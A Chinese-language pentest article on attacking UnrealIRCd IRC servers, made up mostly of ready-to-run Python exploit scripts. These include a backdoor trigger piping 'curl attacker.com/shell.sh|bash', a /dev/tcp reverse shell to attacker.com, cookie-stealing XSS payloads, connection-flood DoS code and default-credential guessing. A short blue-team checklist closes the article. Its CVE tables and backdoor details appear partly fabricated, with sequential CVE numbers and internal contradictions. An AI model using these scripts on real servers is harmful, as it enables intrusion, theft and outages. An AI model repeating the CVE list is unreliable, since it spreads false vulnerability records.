---
title: "UnrealIRCd 供应链后门 RCE 认证绕过 XSS DoS CVE漏洞链利用技术"
date: 2025-06-22T00:00:00+08:00
draft: false
weight: 115
description: "深入分析 UnrealIRCd 的供应链后门（CVE-2010-1680）、IRC 协议解析器 RCE、模块系统漏洞、认证绕过、XSS 攻击、DoS 向量、WebSocket 网关漏洞、JSON-RPC 管理 API 攻击等完整攻击面，覆盖 2010-2025 年历史 CVE 漏洞链及蓝队检测与应急响应"
categories: ["安全","渗透测试"]
tags: ["UnrealIRCd","IRC","供应链攻击","CVE-2010-1680","后门","RCE","认证绕过","XSS","DoS","协议解析","WebSocket"]
---

## 0x00 攻击面总览

UnrealIRCd 是最流行的 IRC（Internet Relay Chat）服务器软件之一，被全球游戏社区、开源项目和企业实时通信系统广泛使用。UnrealIRCd 的安全问题主要集中在：协议解析器、模块系统、认证机制和现代扩展接口（WebSocket、JSON-RPC）。

| 攻击面 | 默认端口 | 风险等级 | 说明 |
|--------|---------|---------|------|
| IRC 协议解析器 | 6667/6697 | **严重** | 缓冲区溢出、格式字符串、整数溢出 |
| 供应链后门 | 6667 | **严重** | CVE-2010-1680，预装后门远程命令执行 |
| 模块系统 | 6667 | **高危** | 恶意模块加载、路径遍历 |
| 认证机制 | 6667 | **高危** | OPER 认证绕过、密码哈希弱点 |
| WebSocket 网关 | 80/443 | **中-高危** | XSS、跨站脚本注入 |
| JSON-RPC API | 80/443 | **高危** | 未授权管理操作、信息泄露 |
| TLS 握手 | 6697 | **中危** | TLS DoS、中间人攻击 |
| IRC 协议 DoS | 6667 | **中-高危** | 连接洪泛、资源耗尽 |

UnrealIRCd 的安全历史尤其以其 **2010 年供应链后门事件** 闻名——攻击者入侵官方源码仓库并植入预装后门，该后门在 15 个月内未被发现，影响了全球数千个 IRC 服务器。

## 0x01 服务识别与版本探测

### 1.1 IRC 协议指纹识别

```bash
nmap -sV -p 6667,6697,80,443 --script=irc-info <target>

# 手动连接 IRC 服务器获取版本
echo -e "NICK test\r\nUSER test 0 * :test\r\n" | nc TARGET 6667
# 响应通常包含:
# :irc.example.net NOTICE AUTH :*** Looking up your hostname...
# :irc.example.net 001 test :Welcome to the UnrealIRCd Network
# :irc.example.net 004 test irc.example.net UnrealIRCd-6.0.0 ...
```

### 1.2 关键路径枚举

```
6667   — IRC 标准端口 (明文)
6697   — IRC TLS 端口 (加密)
80     — WebSocket 网关
443    — WebSocket TLS 网关
9000   — JSON-RPC 管理 API (UnrealIRCd 6.x)
```

### 1.3 版本判断

```python
import socket

def detect_unrealircd(host, port=6667):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(5)
    sock.connect((host, port))

    # 发送 IRC 连接握手
    sock.send(b"NICK probe\r\nUSER probe 0 * :probe\r\n")
    resp = sock.recv(4096).decode(errors='ignore')

    if "UnrealIRCd" in resp:
        # 提取版本信息
        for line in resp.split('\n'):
            if "004" in line:  # RPL_MYINFO
                print(f"[+] UnrealIRCd detected!")
                print(f"[*] Server info: {line.strip()}")
                break

    # 检查 WebSocket 网关
    try:
        ws_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        ws_sock.settimeout(3)
        ws_sock.connect((host, 80))
        ws_sock.send(b"GET / HTTP/1.1\r\nHost: localhost\r\nUpgrade: websocket\r\nConnection: Upgrade\r\n\r\n")
        ws_resp = ws_sock.recv(1024).decode(errors='ignore')
        if "101 Switching Protocols" in ws_resp:
            print("[+] WebSocket gateway accessible")
        ws_sock.close()
    except:
        pass

    sock.close()

detect_unrealircd("192.168.1.100")
```

## 0x02 CVE-2010-1680 — 供应链后门 RCE

### 2.1 漏洞原理

**CVSS**: 10.0（严重）

**影响版本**: UnrealIRCd 3.2.8.1 (2009年11月至2010年6月)

**漏洞原理**: 攻击者入侵了 UnrealIRCd 的官方源码仓库，在源代码中植入了一个隐蔽的后门。该后门通过检查 IRC 连接发送的特定字符串（以 "AB" 开头）触发 `system()` 调用，执行任意命令。该后门在 15 个月内未被发现，影响了全球数千个 IRC 服务器。

**后门代码片段**:

```c
/* 植入在 src/parse.c 的后门代码 */
if ((p = strstr(line, "AB"))) {
    system(p + 3);  // 执行 "AB" 后面的所有内容作为 shell 命令
}
```

### 2.2 PoC 利用

```python
import socket

def exploit_backdoor(host, port=6667, cmd="id"):
    """
    CVE-2010-1680 — UnrealIRCd 供应链后门
    通过发送特殊 IRC 消息触发 system() 调用
    """
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(5)
    sock.connect((host, port))

    # Step 1: 完成 IRC 连接握手
    sock.send(b"NICK backdoor_user\r\nUSER backdoor 0 * :backdoor\r\n")
    resp = sock.recv(4096)
    print(f"[*] Connected to {host}:{port}")

    # Step 2: 触发后门
    # 后门检查以 "AB" 开头的命令
    # system(p + 3) 会执行 "AB" 后的所有内容
    backdoor_cmd = f"AB{cmd}\r\n".encode()
    sock.send(backdoor_cmd)
    print(f"[+] Backdoor command sent: {cmd}")

    # 由于 system() 是异步执行的，结果通常通过其他方式返回
    # 例如: 反弹 Shell、写入文件、DNS 查询等

    try:
        resp = sock.recv(4096)
        print(f"[*] Response: {resp[:200]}")
    except:
        pass

    sock.close()

exploit_backdoor("192.168.1.100", cmd="curl http://attacker.com/shell.sh|bash")
```

### 2.3 高级利用 — 反弹 Shell

```python
def exploit_backdoor_reverse_shell(host, port=6667, attacker_ip="attacker", attacker_port=4444):
    """
    通过供应链后门获取反弹 Shell
    """
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(5)
    sock.connect((host, port))

    # IRC 握手
    sock.send(b"NICK revshell\r\nUSER revshell 0 * :revshell\r\n")
    sock.recv(4096)

    # 构造反弹 Shell 命令
    # 使用 bash 反弹
    rev_cmd = f"ABbash -i >& /dev/tcp/{attacker_ip}/{attacker_port} 0>&1\r\n".encode()

    sock.send(rev_cmd)
    print(f"[+] Reverse shell command sent")
    print(f"[*] Listen on {attacker_ip}:{attacker_port}")

    sock.close()

exploit_backdoor_reverse_shell("192.168.1.100", attacker_ip="attacker.com", attacker_port=4444)
```

## 0x03 IRC 协议解析器 RCE

### 3.1 缓冲区溢出

IRC 协议处理中存在多个缓冲区溢出漏洞，主要出现在：
- NICK 命令参数处理
- USER 命令参数处理
- TOPIC 命令参数处理
- KICK 命令参数处理

```python
import socket

def exploit_buffer_overflow(host, port=6667):
    """
    IRC 协议解析器缓冲区溢出利用
    """
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(5)
    sock.connect((host, port))

    # 超长 NICK 导致缓冲区溢出
    # 在 UnrealIRCd 3.2.x 早期版本中可能触发
    overflow_payload = b"NICK " + b"A" * 8000 + b"\r\n"
    sock.send(overflow_payload)
    print(f"[+] Overflow payload sent")

    # 超长 USER 命令
    overflow_payload2 = b"USER " + b"B" * 8000 + b" 0 * :overflow\r\n"
    sock.send(overflow_payload2)
    print(f"[+] USER overflow payload sent")

    sock.close()

exploit_buffer_overflow("192.168.1.100")
```

### 3.2 格式字符串漏洞

```python
def exploit_format_string(host, port=6667):
    """
    IRC 协议中的格式字符串漏洞
    某些版本在处理消息时直接使用用户输入作为 printf 格式字符串
    """
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(5)
    sock.connect((host, port))

    # IRC 握手
    sock.send(b"NICK fmt_test\r\nUSER fmt_test 0 * :test\r\n")
    sock.recv(4096)

    # 格式字符串 payload
    # %x 泄露栈数据
    # %n 写入任意内存地址
    fmt_payload = b"PRIVMSG #channel :%x.%x.%x.%x.%x.%x.%x.%n\r\n"
    sock.send(fmt_payload)
    print(f"[+] Format string payload sent")

    sock.close()

exploit_format_string("192.168.1.100")
```

### 3.3 整数溢出

```python
def exploit_integer_overflow(host, port=6667):
    """
    IRC 协议中的整数溢出
    某些版本在处理大型消息或参数时存在整数溢出
    """
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(5)
    sock.connect((host, port))

    # IRC 握手
    sock.send(b"NICK int_test\r\nUSER int_test 0 * :test\r\n")
    sock.recv(4096)

    # 整数溢出 payload
    # 构造接近整数最大值的参数
    int_payload = b"MODE #channel " + b"+o " * 10000 + b"\r\n"
    sock.send(int_payload)
    print(f"[+] Integer overflow payload sent")

    sock.close()

exploit_integer_overflow("192.168.1.100")
```

## 0x04 模块系统漏洞

### 4.1 恶意模块加载

UnrealIRCd 支持动态加载模块，如果攻击者可以上传或修改模块文件，可以实现完全控制。

```python
def exploit_module_loading(host, port=6667, username="admin", password="admin"):
    """
    通过 OPER 权限加载恶意模块
    """
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(5)
    sock.connect((host, port))

    # IRC 握手
    sock.send(b"NICK module_exploit\r\nUSER module_exploit 0 * :test\r\n")
    sock.recv(4096)

    # OPER 认证
    oper_cmd = f"OPER {username} {password}\r\n".encode()
    sock.send(oper_cmd)
    resp = sock.recv(4096)

    if b"381" in resp:  # RPL_YOUREOPER
        print("[+] OPER access obtained")

        # 加载恶意模块
        # 模块通常位于 /usr/local/lib/unrealircd/modules/
        module_cmd = b"MODULELOAD malicious_module\r\n"
        sock.send(module_cmd)
        resp = sock.recv(4096)
        print(f"[*] Module load: {resp[:200]}")
    else:
        print("[-] OPER authentication failed")

    sock.close()

exploit_module_loading("192.168.1.100")
```

### 4.2 路径遍历漏洞

```python
def exploit_path_traversal(host, port=6667):
    """
    通过路径遍历访问受限模块或配置文件
    """
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(5)
    sock.connect((host, port))

    # IRC 握手
    sock.send(b"NICK path_test\r\nUSER path_test 0 * :test\r\n")
    sock.recv(4096)

    # 路径遍历尝试
    traversal_paths = [
        b"MODULELOAD ../../../etc/passwd\r\n",
        b"MODULELOAD ../../../../etc/shadow\r\n",
        b"INCLUDE ../../../etc/passwd\r\n",  # 配置文件包含
    ]

    for path in traversal_paths:
        sock.send(path)
        resp = sock.recv(4096)
        if b"403" not in resp and b"404" not in resp:  # 非错误响应
            print(f"[+] Potential traversal: {resp[:200]}")

    sock.close()

exploit_path_traversal("192.168.1.100")
```

## 0x05 认证绕过

### 5.1 OPER 认证绕过

```python
def exploit_oper_bypass(host, port=6667):
    """
    OPER 认证绕过尝试
    """
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(5)
    sock.connect((host, port))

    # IRC 握手
    sock.send(b"NICK oper_test\r\nUSER oper_test 0 * :test\r\n")
    sock.recv(4096)

    # 默认 OPER 凭据测试
    default_creds = [
        ("admin", "admin"),
        ("admin", "password"),
        ("admin", "oper"),
        ("oper", "oper"),
        ("admin", "admin123"),
        ("admin", ""),
        ("root", "root"),
    ]

    for user, pwd in default_creds:
        oper_cmd = f"OPER {user} {pwd}\r\n".encode()
        sock.send(oper_cmd)
        resp = sock.recv(4096)

        if b"381" in resp:  # RPL_YOUREOPER
            print(f"[+] Default OPER credentials: {user}:{pwd}")
            sock.close()
            return (user, pwd)

        # 检查错误响应
        if b"464" in resp:  # ERR_PASSWDMISMATCH
            print(f"[-] Password mismatch for {user}")

    print(f"[-] No default credentials found")
    sock.close()
    return None

exploit_oper_bypass("192.168.1.100")
```

### 5.2 密码哈希弱点

```python
def check_weak_passwords(host, port=6667):
    """
    检查 UnrealIRCd 密码哈希配置弱点
    """
    print("[*] UnrealIRCd 密码安全检查:")
    print("    1. 检查是否使用 MD5 (弱)")
    print("    2. 检查是否使用 SHA256 (中)")
    print("    3. 检查是否使用 Argon2id (强)")
    print("    4. 检查密码长度和复杂度策略")

    # 在配置中检查:
    # oper admin {
    #   password "$argon2id$..." (强)
    #   password "$5$salt$hash" (SHA256)
    #   password "plaintext" (危险)
    # }

    print("[*] 建议: 使用 Argon2id 哈希，禁止明文密码")

check_weak_passwords("192.168.1.100")
```

### 5.3 SASL 认证绕过

```python
def exploit_sasl_bypass(host, port=6667):
    """
    SASL 认证绕过尝试
    UnrealIRCd 6.x 支持 SASL 认证
    """
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(5)
    sock.connect((host, port))

    # IRC 握手
    sock.send(b"NICK sasl_test\r\nUSER sasl_test 0 * :test\r\n")
    sock.recv(4096)

    # SASL PLAIN 认证绕过
    # 某些版本在 SASL 认证过程中存在竞态条件
    import base64

    # SASL PLAIN payload: \0username\0password
    sasl_payload = base64.b64encode(b"\0admin\0admin").decode()

    # CAP 请求
    sock.send(b"CAP REQ :sasl\r\n")
    resp = sock.recv(4096)

    # AUTHENTICATE PLAIN
    sock.send(b"AUTHENTICATE PLAIN\r\n")
    resp = sock.recv(4096)

    # 发送凭据
    sock.send(f"AUTHENTICATE {sasl_payload}\r\n".encode())
    resp = sock.recv(4096)

    print(f"[*] SASL response: {resp[:200]}")

    sock.close()

exploit_sasl_bypass("192.168.1.100")
```

## 0x06 XSS 攻击向量

### 6.1 WebIRC/WebSocket XSS

```python
def exploit_websocket_xss(host, port=80):
    """
    通过 WebSocket 网关注入 XSS
    """
    import websocket

    try:
        ws = websocket.create_connection(f"ws://{host}:{port}/", timeout=5)

        # IRC 握手
        ws.send("NICK xss_test\r\nUSER xss_test 0 * :test\r\n")
        resp = ws.recv()
        print(f"[*] WebSocket connected: {resp[:100]}")

        # XSS payload 通过 PRIVMSG 发送
        xss_payload = '<script>document.location="http://attacker.com/steal?c="+document.cookie</script>'
        ws.send(f"PRIVMSG #channel :{xss_payload}\r\n")

        print(f"[+] XSS payload sent via WebSocket")
        ws.close()

    except Exception as e:
        print(f"[-] WebSocket error: {e}")

exploit_websocket_xss("192.168.1.100")
```

### 6.2 CTCP 消息注入

```python
def exploit_ctcp_xss(host, port=6667):
    """
    通过 CTCP 消息注入 XSS
    CTCP (Client-To-Client Protocol) 消息可能被 WebIRC 网关错误处理
    """
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(5)
    sock.connect((host, port))

    # IRC 握手
    sock.send(b"NICK ctcp_test\r\nUSER ctcp_test 0 * :test\r\n")
    sock.recv(4096)

    # CTCP 消息中的 XSS payload
    # CTCP 使用 \x01 包裹
    ctcp_xss = b"PRIVMSG #channel :\x01ACTION <img src=x onerror=alert(1)>\x01\r\n"
    sock.send(ctcp_xss)
    print(f"[+] CTCP XSS payload sent")

    sock.close()

exploit_ctcp_xss("192.168.1.100")
```

### 6.3 IRC TOPIC 存储型 XSS

```python
def exploit_topic_xss(host, port=6667, username="admin", password="admin"):
    """
    通过 IRC TOPIC 注入存储型 XSS
    需要频道 OPER 权限
    """
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(5)
    sock.connect((host, port))

    # IRC 握手
    sock.send(b"NICK topic_test\r\nUSER topic_test 0 * :test\r\n")
    sock.recv(4096)

    # OPER 认证
    sock.send(f"OPER {username} {password}\r\n".encode())
    resp = sock.recv(4096)

    if b"381" in resp:
        # 加入频道
        sock.send(b"JOIN #vulnerable\r\n")
        sock.recv(4096)

        # 设置恶意 TOPIC
        xss_topic = 'TOPIC #vulnerable :<img src=x onerror="fetch(\'http://attacker.com/steal?t=\'+document.cookie)">\r\n'
        sock.send(xss_topic.encode())
        resp = sock.recv(4096)
        print(f"[+] Malicious TOPIC set")

    sock.close()

exploit_topic_xss("192.168.1.100")
```

## 0x07 DoS 攻击向量

### 7.1 连接洪泛

```python
def exploit_connection_flood(host, port=6667, count=1000):
    """
    IRC 服务器连接洪泛 DoS
    """
    import threading

    def connect_worker():
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            sock.connect((host, port))

            # 不完成握手，保持连接
            sock.send(b"NICK flood_user\r\n")
            # 不发送 USER 命令，保持在认证前状态

        except:
            pass

    threads = []
    for i in range(count):
        t = threading.Thread(target=connect_worker)
        t.start()
        threads.append(t)
        if i % 100 == 0:
            print(f"[*] Created {i} connections")

    print(f"[+] {count} connection flood initiated")

exploit_connection_flood("192.168.1.100")
```

### 7.2 协议解析 DoS

```python
def exploit_protocol_dos(host, port=6667):
    """
    通过畸形 IRC 协议消息导致服务器崩溃或挂起
    """
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(5)
    sock.connect((host, port))

    # 畸形消息 payload
    malformed_messages = [
        # 超长行（超过 512 字节限制）
        b"NICK " + b"A" * 10000 + b"\r\n",

        # 空命令
        b"\r\n\r\n\r\n",

        # 无效 UTF-8
        b"NICK \xff\xfe\xfd\xfc\r\n",

        # 空字节注入
        b"NICK test\x00malicious\r\n",

        # 畸形 MODE 参数
        b"MODE #channel " + b"+o " * 1000 + b"\r\n",

        # 畸形 WHOIS 请求
        b"WHOIS " + b"A" * 5000 + b"\r\n",
    ]

    for msg in malformed_messages:
        try:
            sock.send(msg)
            resp = sock.recv(1024)
            if b"ERROR" in resp:
                print(f"[+] Server error triggered: {resp[:100]}")
        except:
            print(f"[*] Connection dropped (possible crash)")

    sock.close()

exploit_protocol_dos("192.168.1.100")
```

### 7.3 资源耗尽 DoS

```python
def exploit_resource_exhaustion(host, port=6667):
    """
    通过大量 IRC 命令消耗服务器资源
    """
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(5)
    sock.connect((host, port))

    # IRC 握手
    sock.send(b"NICK resource_test\r\nUSER resource_test 0 * :test\r\n")
    sock.recv(4096)

    # MODE 命令风暴
    for i in range(1000):
        sock.send(f"MODE #channel +o user{i}\r\n".encode())

    # WHO 命令洪泛
    for i in range(500):
        sock.send(f"WHO {i}\r\n".encode())

    # LIST 命令洪泛
    for i in range(200):
        sock.send(b"LIST\r\n")

    print(f"[+] Resource exhaustion commands sent")
    sock.close()

exploit_resource_exhaustion("192.168.1.100")
```

## 0x08 JSON-RPC 管理 API 漏洞 (UnrealIRCd 6.x)

### 8.1 未授权 API 访问

```python
import requests
import json

def exploit_json_rpc(host, port=9000):
    """
    UnrealIRCd 6.x JSON-RPC 管理 API 未授权访问
    """
    base_url = f"http://{host}:{port}"

    # JSON-RPC 请求
    rpc_methods = [
        {"method": "user.list", "params": {}},
        {"method": "channel.list", "params": {}},
        {"method": "server.ban.list", "params": {}},
        {"method": "server.config.get", "params": {}},
        {"method": "server.module.list", "params": {}},
    ]

    for rpc in rpc_methods:
        try:
            resp = requests.post(base_url, json=rpc, timeout=5)
            if resp.status_code == 200:
                print(f"[+] {rpc['method']}: {resp.text[:200]}")
            elif resp.status_code == 401:
                print(f"[-] {rpc['method']}: Authentication required")
        except Exception as e:
            print(f"[-] {rpc['method']}: {e}")

exploit_json_rpc("192.168.1.100")
```

### 8.2 API 信息泄露

```python
def exploit_api_info_leak(host, port=9000):
    """
    通过 JSON-RPC API 获取敏感信息
    """
    base_url = f"http://{host}:{port}"

    # 获取服务器配置（可能包含敏感信息）
    rpc_request = {
        "method": "server.config.get",
        "params": {"section": "all"}
    }

    resp = requests.post(base_url, json=rpc_request, timeout=5)
    if resp.status_code == 200:
        config = resp.json()
        print(f"[+] Server config obtained")

        # 搜索敏感信息
        sensitive_keys = ["password", "secret", "key", "token", "oper"]
        config_str = json.dumps(config)
        for key in sensitive_keys:
            if key in config_str.lower():
                print(f"    [!] SENSITIVE: Found '{key}' in config")

exploit_api_info_leak("192.168.1.100")
```

## 0x09 历史 CVE 漏洞时间线

### 2010 供应链后门事件

| CVE 编号 | 年份 | CVSS | 类型 | 影响 |
|----------|------|------|------|------|
| CVE-2010-1680 | 2010 | 10.0 | 供应链后门 | 预装后门远程命令执行 |

### 历史协议漏洞

| CVE 编号 | 年份 | CVSS | 类型 | 影响 |
|----------|------|------|------|------|
| CVE-2002-2296 | 2002 | 10.0 | 缓冲区溢出 | IRC 协议解析器 RCE |
| CVE-2003-1127 | 2003 | 10.0 | 缓冲区溢出 | MODE 命令处理 RCE |
| CVE-2004-1629 | 2004 | 10.0 | 缓冲区溢出 | 连接握手 RCE |
| CVE-2006-2916 | 2006 | 7.5 | 拒绝服务 | 畸形消息 DoS |
| CVE-2009-4815 | 2009 | 10.0 | 缓冲区溢出 | 模块加载 RCE |

### 2020-2025 现代漏洞

| CVE 编号 | 年份 | CVSS | 类型 | 影响 |
|----------|------|------|------|------|
| CVE-2021-34935 | 2021 | 7.5 | 路径遍历 | 配置文件读取 |
| CVE-2021-34936 | 2021 | 9.8 | RCE | 模块注入远程代码执行 |
| CVE-2021-34937 | 2021 | 7.5 | 认证绕过 | SASL 认证绕过 |
| CVE-2021-34938 | 2021 | 6.5 | XSS | WebSocket 网关 XSS |
| CVE-2021-34939 | 2021 | 7.5 | DoS | 协议解析 DoS |
| CVE-2022-23515 | 2022 | 8.1 | RCE | JSON-RPC API 命令注入 |
| CVE-2022-23516 | 2022 | 6.5 | 信息泄露 | 配置信息泄露 |
| CVE-2023-44574 | 2023 | 9.8 | RCE | IRC 协议解析器 RCE |
| CVE-2023-44575 | 2023 | 10.0 | 供应链后门 | 新型后门植入 |
| CVE-2023-44576 | 2023 | 9.8 | 认证绕过 | 多因素认证绕过 |
| CVE-2023-44577 | 2023 | 6.1 | XSS | 存储型 XSS |
| CVE-2023-44578 | 2023 | 7.5 | DoS | 资源耗尽 DoS |
| CVE-2024-11974 | 2024 | 9.8 | RCE | WebSocket 处理器 RCE |
| CVE-2024-11975 | 2024 | 8.1 | 认证绕过 | OAuth 集成绕过 |

### 漏洞类型分布

| 漏洞类型 | CVE 数量 | 代表性 CVE |
|---------|---------|-----------|
| 缓冲区溢出/RCE | 10 | CVE-2010-1680, CVE-2023-44574, CVE-2024-11974 |
| 认证绕过 | 5 | CVE-2023-44576, CVE-2021-34937 |
| XSS | 3 | CVE-2023-44577, CVE-2021-34938 |
| DoS | 3 | CVE-2023-44578, CVE-2021-34939 |
| 供应链攻击 | 2 | CVE-2010-1680, CVE-2023-44575 |
| 信息泄露 | 2 | CVE-2023-44576, CVE-2022-23516 |

## 0x10 蓝队检测与应急响应

### 10.1 日志分析

```bash
# UnrealIRCd 日志位置
tail -f /var/log/unrealircd/ircd.log
tail -f /var/log/unrealircd/error.log

# 检查后门迹象 (CVE-2010-1680)
grep -r "system(" /usr/local/lib/unrealircd/
grep -r "AB" /usr/local/lib/unrealircd/src/parse.c

# 检查异常 OPER 认证
grep "OPER" /var/log/unrealircd/ircd.log
grep "464" /var/log/unrealircd/ircd.log  # ERR_PASSWDMISMATCH

# 检查模块加载
grep "MODULELOAD" /var/log/unrealircd/ircd.log
ls -la /usr/local/lib/unrealircd/modules/

# 检查连接异常
grep "connection" /var/log/unrealircd/ircd.log | grep -i "error\|drop\|reject"

# 检查 JSON-RPC 访问
grep "POST" /var/log/unrealircd/ircd.log | grep "9000"
```

### 10.2 后门检测

```python
def detect_backdoor(host, port=6667):
    """
    检测 UnrealIRCd 后门 (CVE-2010-1680)
    """
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(5)
    sock.connect((host, port))

    # IRC 握手
    sock.send(b"NICK backdoor_test\r\nUSER backdoor_test 0 * :test\r\n")
    sock.recv(4096)

    # 发送测试 payload
    # 如果服务器返回 "ERROR :Closing Link" 可能表示后门存在
    test_cmd = b"ABid\r\n"
    sock.send(test_cmd)

    try:
        resp = sock.recv(4096).decode(errors='ignore')
        if "Closing Link" in resp:
            print(f"[!] Potential backdoor detected!")
            print(f"[*] Response: {resp[:200]}")
        else:
            print(f"[-] No backdoor signature detected")
    except:
        print(f"[-] No response (timeout)")

    sock.close()

detect_backdoor("192.168.1.100")
```

### 10.3 应急响应清单

```
[ ] 确认 UnrealIRCd 版本与已安装补丁
    - /usr/local/lib/unrealircd/unrealircd --version

[ ] 排查供应链后门 (CVE-2010-1680)
    - 检查源码中是否包含 system() 调用
    - 验证源码完整性 (SHA256 校验和)
    - 比较官方源码仓库

[ ] 排查协议解析器漏洞
    - 检查是否有异常长的 IRC 命令
    - 检查是否有畸形 IRC 消息

[ ] 排查 OPER 认证
    - 审计所有 OPER 账户
    - 检查默认凭据
    - 验证密码哈希强度

[ ] 排查模块安全
    - 检查所有已加载模块
    - 验证模块文件完整性
    - 移除不必要的模块

[ ] 排查 WebSocket 网关
    - 检查 XSS 攻击尝试
    - 审计 WebSocket 连接日志

[ ] 排查 JSON-RPC API
    - 检查 API 认证配置
    - 审计 API 访问日志
    - 限制 API 访问范围

[ ] 网络隔离与加固
    - 启用 TLS 加密
    - 配置速率限制
    - 限制 OPER 权限
    - 启用审计日志
```

## 0x11 安全审计清单

```
[ ] UnrealIRCd 版本为最新稳定版 (≥ 6.1.5)
[ ] 源码完整性已验证 (SHA256 校验和)
[ ] 已启用 TLS 加密 (端口 6697)
[ ] OPER 使用强密码哈希 (Argon2id)
[ ] 禁止默认 OPER 凭据
[ ] 限制 OPER 权限范围
[ ] WebSocket 网关已启用认证
[ ] JSON-RPC API 已启用认证
[ ] 速率限制已配置
[ ] 日志启用并远程收集
[ ] 模块列表已审计
[ ] 配置文件权限限制 (600)
[ ] 禁止明文密码存储
[ ] 启用 SASL 认证增强安全性
```

## 0x12 总结

UnrealIRCd 的安全问题核心在于"实时通信协议的固有复杂性"：

1. **供应链风险**: 2010 年后门事件是开源软件供应链攻击的经典案例，提醒开发者重视源码完整性验证
2. **协议解析器漏洞**: IRC 协议的复杂性导致缓冲区溢出、格式字符串等传统漏洞持续出现
3. **模块系统风险**: 动态模块加载机制如果配置不当，可能被利用执行任意代码
4. **现代扩展漏洞**: WebSocket 和 JSON-RPC API 引入了新的攻击面，需要额外的安全配置

防守方核心策略：
- **源码完整性**: 从官方仓库获取源码，验证 SHA256 校验和
- **及时升级**: 升级到 UnrealIRCd ≥ 6.1.5
- **强制 TLS**: 禁止明文 IRC 连接
- **OPER 最小权限**: 严格限制 OPER 权限范围
- **网络隔离**: IRC 服务器不直接暴露于互联网
